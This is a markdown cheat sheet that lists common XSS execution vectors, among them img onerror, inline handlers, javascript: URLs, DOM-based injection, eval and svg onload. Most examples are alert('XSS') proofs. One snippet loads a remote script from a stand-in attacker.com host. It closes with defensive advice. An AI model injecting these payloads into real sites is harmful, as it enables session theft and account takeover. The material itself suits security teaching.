# 🛑 Common JavaScript Execution Methods Used in XSS Attacks

Cross-Site Scripting (XSS) attacks aim to execute arbitrary JavaScript in the context of a victim’s browser. Attackers use various methods to inject and run malicious code, often exploiting injection points in HTML, attributes, URLs, and JS APIs.

Below are the most commonly abused vectors and techniques used during real-world XSS attacks:

---

## 1. `<img onerror="...">` — Attribute-Based Execution

Triggers when the image fails to load.

```html
<img src="x" onerror="alert('XSS')" />
```

---

## 2. `<script>` Injection

Copying and pasting the untrusted code in the browser's console.

```js
const s = document.createElement("script");
s.src = "http://attacker.com/script.js";
document.body.appendChild(s);
```

---

## 3. Inline Event Handlers (e.g., `onclick`, `onmouseover`)

```html
<div onclick="alert('XSS')">Click Me</div>
<a href="#" onmouseover="alert('XSS')">Hover Me</a>
```

---

## 4. `javascript:` URLs

Common in `href` attributes:

```html
<a href="javascript:alert('XSS')">Click</a>
```

---

## 5. `<iframe src="javascript:...">`

```html
<iframe src="javascript:alert('XSS')"></iframe>
```

---

## 6. DOM-Based XSS

The vulnerable code is in the frontend, like:

```js
document.body.innerHTML = location.hash;
```

URL: `https://example.com/#<img src=x onerror=alert('XSS')>`

---

## 7. `eval()` or `Function()` execution

Used when user input is passed directly into dangerous JS APIs:

```js
eval(userInput); // BAD
new Function(userInput)(); // BAD
```

---

## 8. `setTimeout("...", delay)` or `setInterval("...", interval)`

Attackers inject JS into the string form:

```js
setTimeout("alert('XSS')", 1000);
```

---

## 9. Malformed `<svg>` or `<math>` Tags

Some browsers allow script execution inside SVG with event handlers:

```html
<svg onload="alert('XSS')"></svg>
```

---

## 10. `<object>`, `<embed>`, and `<body onload>`

```html
<body onload="alert('XSS')">
  <object data="javascript:alert('XSS')"></object>
</body>
```

---

## 11. Script Injection via `<meta>` or malformed `<style>`

```html
<meta http-equiv="refresh" content="0;url=javascript:alert('XSS')" />
<style>
  @import 'javascript:alert("XSS")';
</style>
```

---

## 🚨 Summary Table

| Technique                    | Vector Type         | Notes                                           |
| ---------------------------- | ------------------- | ----------------------------------------------- |
| `<img onerror>`              | Attribute-based     | Very common, simple payload                     |
| `<script>` tag               | HTML injection      | Works if innerHTML is used unsafely             |
| Inline handlers              | HTML injection      | Works if tag attributes are not escaped         |
| `javascript:` URLs           | URI-based           | Often blocked by CSP in modern apps             |
| `eval`, `Function`           | JavaScript APIs     | Dangerous, should never be used with user input |
| `<svg onload>`               | SVG namespace       | Works in some browser contexts                  |
| `<iframe src="javascript:">` | Tag-based           | Often blocked by CSP                            |
| DOM-based injection          | Frontend logic flaw | Harder to detect in static scans                |

---

> ✅ Defense: Always sanitize user input, use CSP headers, avoid inline JS, and use trusted libraries like DOMPurify.
